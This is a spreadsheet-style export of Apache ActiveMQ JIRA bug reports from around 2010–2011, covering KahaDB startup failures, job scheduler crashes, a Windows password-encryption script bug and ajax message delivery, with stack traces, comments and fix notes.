see http://activemq.2283324.n4.nabble.com/Bug-with-DiscardingDLQBrokerPlugin-reportInterval-Not-Used-td3174509.html",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14778,,,Wed Jan 05 10:28:40 UTC 2011,,,,,,,,,,,"0|i0ak3j:",59529,,,,,,,,,,,,,,,,,,,,,"05/Jan/11 10:28;gtully;suggested fix from user email applied in r1055395, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kahaDB 3 fails to start after server VM reset,AMQ-3104,12494036,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,hsn,hsn,24/Dec/10 13:27,02/May/13 02:29,14/Jul/23 05:43,15/Sep/11 11:38,5.4.2,,,,,5.6.0,,,Message Store,,,,3,,,,,,,,,"KahaDB fails to start after RESET (poweroff) virtual machine with activemq broker.

2010-12-24 13:08:07,577 | WARN  | destroyApplicationContextOnStop parameter is deprecated, please use shutdown hooks instead | org.apache.activemq.xbean.XBeanBrokerService | main
2010-12-24 13:08:07,619 | INFO  | PListStore:/usr/local/lib/activemq/data/localhost/tmp_storage started | org.apache.activemq.store.kahadb.plist.PListStore | main
2010-12-24 13:08:07,687 | INFO  | Using Persistence Adapter: KahaDBPersistenceAdapter[/usr/local/lib/activemq/data/kahadb] | org.apache.activemq.broker.BrokerService | main
2010-12-24 13:08:09,706 | INFO  | KahaDB is version 3 | org.apache.activemq.store.kahadb.MessageDatabase | main
2010-12-24 13:08:09,727 | ERROR | Failed to start ActiveMQ JMS Message Broker. Reason: java.io.IOException: Invalid location: 1:490436, : java.lang.NegativeArraySizeException | org.apache.activemq.broker.BrokerService | main
java.io.IOException: Invalid location: 1:490436, : java.lang.NegativeArraySizeException
	at org.apache.kahadb.journal.DataFileAccessor.readRecord(DataFileAccessor.java:94)
	at org.apache.kahadb.journal.Journal.read(Journal.java:596)
	at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)
	at org.apache.activemq.store.kahadb.MessageDatabase.recoverProducerAudit(MessageDatabase.java:484)
	at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:438)
	at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:315)
	at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:357)
	at org.apache.activemq.store.kahadb.MessageDatabase.doStart(MessageDatabase.java:222)
	at org.apache.activemq.store.kahadb.KahaDBStore.doStart(KahaDBStore.java:180)
	at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:53)
	at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.start(KahaDBPersistenceAdapter.java:186)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:485)
	at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:60)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:616)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:117)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:115)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:143)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:85)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:616)
	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
	at org.apache.activemq.console.Main.main(Main.java:107)
2010-12-24 13:08:09,749 | INFO  | ActiveMQ Message Broker (localhost, null) is shutting down | org.apache.activemq.broker.BrokerService | main
2010-12-24 13:08:09,751 | INFO  | Network Connector toRADIM Stopped | org.apache.activemq.network.NetworkConnector | main
2010-12-24 13:08:09,751 | INFO  | Connector openwire Stopped | org.apache.activemq.broker.TransportConnector | main
2010-12-24 13:08:09,765 | INFO  | PListStore:/usr/local/lib/activemq/data/localhost/tmp_storage stopped | org.apache.activemq.store.kahadb.plist.PListStore | main
2010-12-24 13:08:09,765 | INFO  | Stopping async queue tasks | org.apache.activemq.store.kahadb.KahaDBStore | main
2010-12-24 13:08:09,765 | INFO  | Stopping async topic tasks | org.apache.activemq.store.kahadb.KahaDBStore | main
2010-12-24 13:08:09,765 | INFO  | Stopped KahaDB | org.apache.activemq.store.kahadb.KahaDBStore | main
2010-12-24 13:08:10,250 | INFO  | ActiveMQ JMS Message Broker (localhost, null) stopped | org.apache.activemq.broker.BrokerService | main
","FreeBSD 8.1, openjdk 1.6.20",alecw,hc,hsn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3422,"24/Dec/10 13:30;hsn;db-1.log.xz;https://issues.apache.org/jira/secure/attachment/12466935/db-1.log.xz","24/Dec/10 13:30;hsn;db.data.xz;https://issues.apache.org/jira/secure/attachment/12466933/db.data.xz","24/Dec/10 13:30;hsn;db.redo.xz;https://issues.apache.org/jira/secure/attachment/12466934/db.redo.xz",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60101,,,Thu Sep 15 11:40:30 UTC 2011,,,,,,,,,,,"0|i0ak4n:",59534,,,,,,,,,,,,,,,,,,,,,"24/Dec/10 13:30;hsn;Database files;;;","21/Mar/11 18:48;alecw;I have also experienced this problem, and discovered some other details that might be useful:

- After getting a stack trace like the above once, if you try to start ActiveMQ again, it works.  I haven't figured out yet if anything is lost from the DB.

- If you try to do graceful shutdown of a machine with ActiveMQ/KahaDB running, you can't.  The message ""mount: / is busy"" appears, and an ungraceful shutdown is needed if ActiveMQ isn't stopped first.;;;","12/Sep/11 11:06;lviggiano;I had the same problem in production.

During the shutdown process RedHat does not execute the shutdown init script under /etc/init.d/yourservice if you don't have a corresponding file under /var/lock/subsys/yourservice. This causes the KahaDB file corruption.

Personally I think that Redhat is wrong in requiring the /var/lock/subsys stuff (documented here: http://www.redhat.com/magazine/008jun05/departments/tips_tricks/ ""Why do init scripts require lock files?""). And I think that KahaDB does wrong corrupting its file if the process get ungraciously killed by a server shutdown, since the meaning of using it is to recover from failures (ie. a server crash, which won't do a clean shutdown).

Regards,

Luigi;;;","15/Sep/11 11:38;gtully;With the fix for https://issues.apache.org/jira/browse/AMQ-3422 a failure to recover the producerAudit does not cause startup to fail.;;;","15/Sep/11 11:40;gtully;The description makes it appear unrelated but the fix for https://issues.apache.org/jira/browse/AMQ-3422 included traping errors relating to the recovery of the producer audit. Which is the problem here.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Queue stalls after Job Scheduler component shuts down.,AMQ-3103,12493964,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,swapnonil,swapnonil,23/Dec/10 10:43,02/Jun/11 14:07,14/Jul/23 05:43,02/Jun/11 14:07,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"Observation
----
Active MQ stops accepting all incoming messages destined for a particular queue, after the scheduler component processing scheduled messages on that queue encounters an Null Pointer Exception.

Environment
----
We are using the Spring JMSTemplate component to post messages onto a queue. We also place a delay of 30 seconds on each message before posting
{noformat}
message.setLongProperty(ScheduledMessage.AMQ_SCHEDULED_DELAY, Integer.parseInt(""30"") * 1000);
{noformat}

We use the Spring Default Message Listener Container to receive messages.

Normally the broker runs fine and we have seen messages appear under the ""Scheduled"" tab on the Active MQ Console, after which they processed normally and we can tally using the ""Messages Enqueued"" and  the ""Messages Dequeued"" numbers. But occasionally the Job Scheduler fails with the following exception.

{code:xml}
2010-12-10 16:31:38,522 | ERROR | JMS Failed to schedule job | org.apache.activemq.broker.scheduler.JobSchedulerImpl | JobScheduler:JMS
java.lang.NullPointerException
        at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:264)
        at org.apache.kahadb.index.BTreeNode.getChild(BTreeNode.java:225)
        at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:330)
        at org.apache.kahadb.index.BTreeIndex.remove(BTreeIndex.java:194)
        at org.apache.activemq.broker.scheduler.JobSchedulerImpl.remove(JobSchedulerImpl.java:347)
        at org.apache.activemq.broker.scheduler.JobSchedulerImpl$4.execute(JobSchedulerImpl.java:125)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.broker.scheduler.JobSchedulerImpl.remove(JobSchedulerImpl.java:123)
        at org.apache.activemq.broker.scheduler.JobSchedulerImpl.mainLoop(JobSchedulerImpl.java:515)
        at org.apache.activemq.broker.scheduler.JobSchedulerImpl.run(JobSchedulerImpl.java:429)
        at java.lang.Thread.run(Thread.java:619)
2010-12-10 16:31:39,561 | INFO  | JobSchedulerStore:activemq-data/primary/scheduler stopped | org.apache.activemq.broker.scheduler.JobSchedulerStore | JobScheduler:JMS
{code}

Why does the Job Scheduler fail? One possible reason we have found is that the clock time settings on the VMs producing the messages and the broker as well as the consumers are all different. So the Job Scheduler may be shutting itself down arbitrarily due to this difference in clock. We are in the process of syncing all clocks but we are not sure whether this will solve the problem.

Bug
----
But the Bug really is, even if the Job Scheduler encounters an Null Pointer, why should it shutdown? Even more problematic is the fact that the queue itself stalls and does not accept anymore messages after the Job Scheduler shuts down.
The only way to recover is to completely delete the data directory.

I am attaching the activemq log and activemq configuration file.


","Redhat Enterprise Linux 5.X, 
JDK 1.5 32-bit
JDK 1.6 64-bit
",matt_good@yahoo.com,moczarski,swapnonil,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Dec/10 05:44;swapnonil;activemq-1.log;https://issues.apache.org/jira/secure/attachment/12466926/activemq-1.log","23/Dec/10 10:45;swapnonil;activemq.log;https://issues.apache.org/jira/secure/attachment/12466875/activemq.log","23/Dec/10 10:45;swapnonil;activemq.xml;https://issues.apache.org/jira/secure/attachment/12466876/activemq.xml",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,46496,,,Thu Jun 02 14:07:24 UTC 2011,,,,,,,,,,,"0|i0ak4v:",59535,,,,,,,,,,,,,,,,,,,,,"23/Dec/10 10:45;swapnonil;Active MQ Log and Config files from our production servers.;;;","24/Dec/10 05:42;swapnonil;Hi Everybody,

Another observation. This one is funny.

We are observing that the Job Scheduler component *shuts down everyday precisely at 01:48 hours GMT.*
As mentioned earlier, the way we recover from these failures is by
* Stopping the broker using $> ./activemq stop
* Deleting the entire data directory
* Restarting the broker using $> ./activemq start

Are we missing doing something for the recovery?

I am re-attaching another log file named activemq-1.log. This one is from our staging servers where you would observe that the Job Scheduler shuts itself precisely at 01:48 hours.
;;;","15/Jan/11 10:08;swapnonil;The broker shutdown yesterday *at the same time i.e 01:49 hours GMT on the 14th of January 2011*. The broker ran ok for about 20 days.;;;","15/Jan/11 10:22;swapnonil;Raising this to critical as this bug is causing *loss of messages*. The only way to recover from this error is to delete the data directory completely.;;;","31/Jan/11 16:57;laslos;Hello,
we got the same bug in our setup. The differenz is that there is no observable reason why the scheduler throws the exception and shut down.

Is somebody working on this issue?

Thanks
Laslo;;;","02/Feb/11 21:50;moczarski;We got similar problems. The scheduler stops from time to time due to an exception. Maybe, the cause is an unsynchronized method in the scheduler which results in a broken store structure. I described the issue in AMQ-3140. Testcase and patch is available :-) Would be interesting to see if the patch fix this issue.;;;","09/Mar/11 23:23;tabish;There have been several fixes to the scheduler in trunk, have you tested against a 5.5.0 SNAPSHOT to see if this has been resolved?;;;","10/Mar/11 15:50;swapnonil;Hi Timothy

I will test against 5.5.0 Snapshot and post my observations.;;;","19/May/11 14:41;swapnonil;Hi,

I have not had this issue after upgrading to the Active MQ 5.5.0 Snapshot. Will upgrade all our production servers to Active Mq 5.5.0 in that case.;;;","02/Jun/11 14:07;tabish;User reports problems went away by upgrading to a 5.5.0 build.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Issues in password encryption,AMQ-3101,12493841,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,cgupta24,cgupta24,22/Dec/10 08:12,13/Nov/13 16:52,14/Jul/23 05:43,13/Nov/13 16:52,5.4.2,,,,,5.10.0,,,Broker,,,,0,,,,,,,,,"I am trying to use security features provided in activemq 5.4.2, I downloaded and extractd the zip file. I am trying the below command to encrypt the password but getting few errors, below are the details ...


H:\apache-activemq-5.4.2-bin\apache-activemq-5.4.2>bin\activemq encrypt --passwo
rd activemq --input mypassword
Java Runtime: IBM Corporation 1.6.0 G:\IBM\IBM-JDK\ibm_sdk60\ibm_sdk60\jre
  Heap sizes: current=4096k  free=2789k  max=524288k
    JVM args: -Xjcl:jclscar_24 -Dcom.ibm.oti.vm.bootstrap.library.path=G:\IBM\IB
M-JDK\ibm_sdk60\ibm_sdk60\jre\bin -Dsun.boot.library.path=G:\IBM\IBM-JDK\ibm_sdk
60\ibm_sdk60\jre\bin -Djava.library.path=G:\IBM\IBM-JDK\ibm_sdk60\ibm_sdk60\jre\
bin;.;C:\Perl\bin;C:\Program Files\Common Files\NetSarang;C:\WINDOWS\system32;C:
\WINDOWS;C:\WINDOWS\System32\Wbem;G:\IBM\IBM-JDK\ibm_sdk60\ibm_sdk60\bin;H:\Java
\apache-ant-1.7.0-bin\apache-ant-1.7.0\bin;C:\Program Files\Windows Imaging\ -Dj
ava.home=G:\IBM\IBM-JDK\ibm_sdk60\ibm_sdk60\jre -Djava.ext.dirs=G:\IBM\IBM-JDK\i
bm_sdk60\ibm_sdk60\jre\lib\ext -Duser.dir=H:\apache-activemq-5.4.2-bin\apache-ac
tivemq-5.4.2 _j2se_j9=71168 -Xdump -Dconsole.encoding=Cp437 -Djava.class.path=.
-Dcom.sun.management.jmxremote -Xmx512M -Dorg.apache.activemq.UseDedicatedTaskRu
nner=true -Djava.util.logging.config.file=logging.properties -Dactivemq.classpat
h=H:\apache-activemq-5.4.2-bin\apache-activemq-5.4.2/conf;H:\apache-activemq-5.4
.2-bin\apache-activemq-5.4.2/conf; -Dactivemq.home=H:\apache-activemq-5.4.2-bin\
apache-activemq-5.4.2 -Dactivemq.base=H:\apache-activemq-5.4.2-bin\apache-active
mq-5.4.2 -Djava.class.path=H:\apache-activemq-5.4.2-bin\apache-activemq-5.4.2/bi
n/run.jar -Dsun.java.command=H:\apache-activemq-5.4.2-bin\apache-activemq-5.4.2/
bin/run.jar start encrypt --password activemq --input mypassword -Dsun.java.laun
cher=SUN_STANDARD _port_library
ACTIVEMQ_HOME: H:\apache-activemq-5.4.2-bin\apache-activemq-5.4.2
ACTIVEMQ_BASE: H:\apache-activemq-5.4.2-bin\apache-activemq-5.4.2
Loading message broker from: encrypt
ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: java.la
ng.IllegalArgumentException: Invalid broker URI, no scheme specified: encrypt
java.lang.RuntimeException: Failed to execute start task. Reason: java.lang.Ille
galArgumentException: Invalid broker URI, no scheme specified: encrypt
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand
.java:98)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractC
ommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand
.java:143)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractC
ommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.ja
va:85)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:59)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:39)
        at java.lang.reflect.Method.invoke(Method.java:612)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: java.lang.IllegalArgumentException: Invalid broker URI, no scheme spe
cified: encrypt",Win XP,davsclaus,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,65683,,,Wed Nov 13 16:52:26 UTC 2013,,,,,,,,,,,"0|i0eaq7:",81500,,,,,,,,,,,,,,,,,,,,,"09/Aug/11 12:44;lgeidel;had the same problem and found the solution (it's a windows-only problem with the activemq.bat):

the following line in the activemq.bat adds ""start"" as the first argument:
""%_JAVACMD%"" %SUNJMX% %ACTIVEMQ_DEBUG_OPTS% %ACTIVEMQ_OPTS% %SSL_OPTS% -Dactivemq.classpath=""%ACTIVEMQ_CLASSPATH%"" -Dactivemq.home=""%ACTIVEMQ_HOME%"" -Dactivemq.base=""%ACTIVEMQ_BASE%"" -jar ""%ACTIVEMQ_HOME%/bin/run.jar"" start %*

so ""activemq.bat encrypt --password xxx --input yyy"" becomes ""activemq.bat start encrypt --password xxx --input yyy"", which calls the StartCommand.class instead of the intended EncryptCommand.class. the StartCommand.class then tries to load a broker from the uri ""encrypt"" ...

long story short: simply remove the ""start"" from there (you'll have to start activemq with ""activemq start"" then);;;","13/Nov/13 16:52;davsclaus;Thanks for reporting.

Lars, thanks for providing the solution. From ActiveMQ 5.10 onwards the start command is not included out of the box, and you need to start the broker like on unix

bin\activemq.bat start

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker policyEntry DurableTopicPrefetch is ignored by default because of connection.optimizedMessageDispatch,AMQ-3095,12493544,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,17/Dec/10 18:29,17/Dec/10 18:37,14/Jul/23 05:43,17/Dec/10 18:37,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"By default optimizedMessageDispatch is enabled, which means the prefetch for a durable sub will be 1000, but the broker is checking just for the default value 100 to determine if it will override. The broker needs to check for both 100 and 1000 or optimizedMessageDispatch=false needs to be used on a connection factory.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14779,,,Fri Dec 17 18:37:38 UTC 2010,,,,,,,,,,,"0|i0ak53:",59536,,,,,,,,,,,,,,,,,,,,,"17/Dec/10 18:37;gtully;resolved in r1050463;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ajax client does not receive all messages,AMQ-3094,12493543,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,alexdean,alexdean,17/Dec/10 18:29,12/May/14 17:09,14/Jul/23 05:43,28/Jan/11 15:26,5.4.2,,,,,5.5.0,,,,,,,0,,,,,,,,,"Not all messages written to a destination are delivered to an ajax client.  This seems particularly true if more than 1 message should be returned to a client at once.  Often, if 5 messages are available, only the first 1 is actually returned in the <ajax-response> XML.  The other 4 are lost.

Steps to reproduce:
 * Place the attached chat-sent.html in activemq/webapps/demo/  (or in activemq-trunk/activemq-web-demo/src/main/webapp in an svn working copy).
 * Start ActiveMQ.
 * Browse to http://localhost:8161/demo/chat.html & join the chat room.
 * In a new window, browse to http://localhost:8161/demo/chat-send.html

chat-send.html will send 5 message to topic://CHAT.DEMO.  Only 1 (or sometimes 2) messages will be received by the original browser window which is subscribed to the topic.  The activemq web admin will verify that 5 messages were actually sent.","OSX 10.6 on MacBook Pro

java version ""1.6.0_20""
Java(TM) SE Runtime Environment (build 1.6.0_20-b02-279-10M3065)
Java HotSpot(TM) 64-Bit Server VM (build 16.3-b01-279, mixed mode)
",alexdean,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3585,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5182,,,"10/Jan/11 15:55;alexdean;all_messages_are_delivered_to_ajax_clients.2.patch;https://issues.apache.org/jira/secure/attachment/12467892/all_messages_are_delivered_to_ajax_clients.2.patch","07/Jan/11 20:27;alexdean;all_messages_are_delivered_to_ajax_clients.patch;https://issues.apache.org/jira/secure/attachment/12467757/all_messages_are_delivered_to_ajax_clients.patch","17/Dec/10 18:30;alexdean;chat-send.html;https://issues.apache.org/jira/secure/attachment/12466479/chat-send.html","17/Dec/10 19:10;alexdean;include-commons-httpclient-in-pom-xml.patch;https://issues.apache.org/jira/secure/attachment/12466485/include-commons-httpclient-in-pom-xml.patch",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14715,,,Fri Jan 28 15:26:18 UTC 2011,,,,,,,,,,,"0|i0ak5b:",59537,,,,,,,,,,,,,,,,,,,,,"17/Dec/10 18:30;alexdean;Test file which publishes 5 messages to topic://CHAT.DEMO.;;;","17/Dec/10 19:10;alexdean;Attached test case does the following:
 * publishes 3 messages to queue://test
 * subscribes to queue://test using an http POST to the AjaxServlet
 * polls for messages

The results of the test are inconsistent.  Sometimes the client receives all messages, sometimes the client receives 0 messages.  (See attached test output in AjaxTest-output.txt.)  These results are not consistent with what I'm seeing in JavaScript testing, where I always seem to receive at least one message, but still provide some documentation for the issue.;;;","17/Dec/10 22:10;alexdean;In AjaxTest-output.txt, also note that for the test runs where no messages are received also show 2 GET requests being made.  The test run where all messages are received shows only a single GET request.  I'm not sure what that means, given that the test has only a single GET.;;;","22/Dec/10 23:52;alexdean;I added 1 debugging statement to MessageListenerServlet.writeMessageResponse.  (See attached patch & sample output.)  The output shows that several individual messages sent from another web client are contained in properties of this single ActiveMQTextMessage.  This seems very likely to be the root cause of the problem.

Is this normal behavior, and we need to search all properties of a TextMessage when writing a response to a client?  Or is it that we need to send messages differently so each 'send' POST actually creates a distinct TextMessage?;;;","23/Dec/10 13:22;dejanb;Fixed with svn revision 1052259.

The problem was that messages received between POST and GET calls were ignored. That should be fixed now. I modified a provided test a bit to demonstrate this issue every time.

Thanks for the great work!;;;","23/Dec/10 23:47;alexdean;Dejan: Take a look at the message properties in https://issues.apache.org/jira/secure/attachment/12466851/write_message_response_debugging_output.txt.  There are four messages here, but only 1 of them gets delivered.

The interesting bits are these:
  message=<message type=""chat"" from=""test-user"">message two</message>
  text = <message type=""chat"" from=""test-user"">message five</message>
  destination = topic://CHAT.DEMO
  m1=<message type=""chat"" from=""test-user"">message three</message>
  m2=<message type=""chat"" from=""test-user"">message four</message>
  m3=<message type=""chat"" from=""test-user"">message five</message>
  t1=send
  t3=send
  t2=send
  d1=topic://CHAT.DEMO
  d2=topic://CHAT.DEMO
  d3=topic://CHAT.DEMO

When an ajax client sends many messages in a short amount of time, they are then delivered to other clients in a single ActiveMQTextMessage.  writeMessageResponse() doesn't handle this properly, and only delivers one of the messages to a subscriber.

I'm not sure if this is a problem on the sending or receiving side.  (Is it legitimate to have multiple messages piled into a single ActiveMQTextMessage like this?)  I agree the junit test now passes, but I don't think the issue is resolved yet.  I'll work on getting some more tests created which reproduce this issue.  For now, you should be able to reproduce it using the chat-send.html script I've already attached to the ticket.;;;","05/Jan/11 19:44;alexdean;Attached test shows that an ajax client will miss messages which arrive while an ajax poll request is in progress.

This test uses org.eclipse.jetty.client.HttpClient rather than org.apache.commons.httpclient.HttpClient.  I was able to get session handling working with the Jetty HttpClient, and it's much better at async requests than the commons HttpClient.

I sometimes see an org.eclipse.jetty.io.EofException in the poll request.  The cause is unclear.  Sometimes the error disappears simply by re-running the test.  Sometimes doing a recompile of activemq-trunk/activemq-web and then re-running the test causes the error to disappear.;;;","05/Jan/11 19:46;alexdean;Sample test output showing the presence/absence of the EofException I noted.;;;","07/Jan/11 20:27;alexdean;Patch will allow an ajax client to receive all messages.  Several other tests are included for previously-untested ajax code.

The following tests fail w/o the patch:
  testAjaxClientReceivesMessagesWhichAreSentToQueueWhileClientIsPolling
  testAjaxClientReceivesMessagesWhichAreSentToTopicWhileClientIsPolling
  testStompMessagesAreReceivedByAjaxClient;;;","10/Jan/11 15:47;alexdean;Updated my svn working copy & re-generated patch due to request from Jeff Rose.  Now based on trunk r1057227.;;;","10/Jan/11 15:55;alexdean;Updated my svn working copy & re-generated patch due to request from Jeff Rose. Now based on trunk r1057227.  Previous version of this patch (w/ identical file name) was missing 1 test which should not have been omitted.;;;","28/Jan/11 15:26;alexdean;Resolved in svn revision 1064725.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
